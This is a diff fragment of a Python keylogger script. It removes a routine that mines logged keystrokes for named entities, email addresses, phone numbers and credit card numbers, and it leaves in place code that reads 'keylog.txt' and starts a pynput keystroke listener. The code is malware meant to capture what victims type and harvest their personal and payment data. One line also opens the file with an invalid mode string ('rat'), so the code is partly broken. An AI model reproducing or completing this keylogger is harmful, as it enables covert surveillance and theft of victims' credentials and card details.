@@ -30,36 +30,6 @@ def process_log():
     with open("keylog.txt", "rat") as file:
         log_data = file.read()
 
-    # Tokenize and POS tagging
-    tokens = word_tokenize(log_data)
-    tagged_tokens = pos_tag(tokens)
-
-    # Extract named entities (NE) using NLTK
-    named_entities = ne_chunk(tagged_tokens)
-
-    # Extract critical information like emails, phone numbers, etc.
-    extract_critical_info(log_data)
-
-    # Print out named entities (could be critical info)
-    print("Named Entities Detected: ")
-    print(named_entities)
-
-def extract_critical_info(text):
-    # Example of extracting emails
-    emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b', text)
-    if emails:
-        print("Email(s) found:", emails)
-
-    # Example of extracting phone numbers
-    phone_numbers = re.findall(r'\+?\d{1,4}[\s-]?\(?\d{1,4}?\)?[\s-]?\d{1,4}[\s-]?\d{1,4}', text)
-    if phone_numbers:
-        print("Phone number(s) found:", phone_numbers)
-
-    # Example of extracting credit card numbers (basic pattern, not fully secure for real use)
-    credit_cards = re.findall(r'\b(?:\d[ -]*?){13,16}\b', text)
-    if credit_cards:
-        print("Credit card number(s) found:", credit_cards)
-
 # Define a function to start the keylogger
 def start_keylogger():
     # Collect keystrokes using the pynput listener
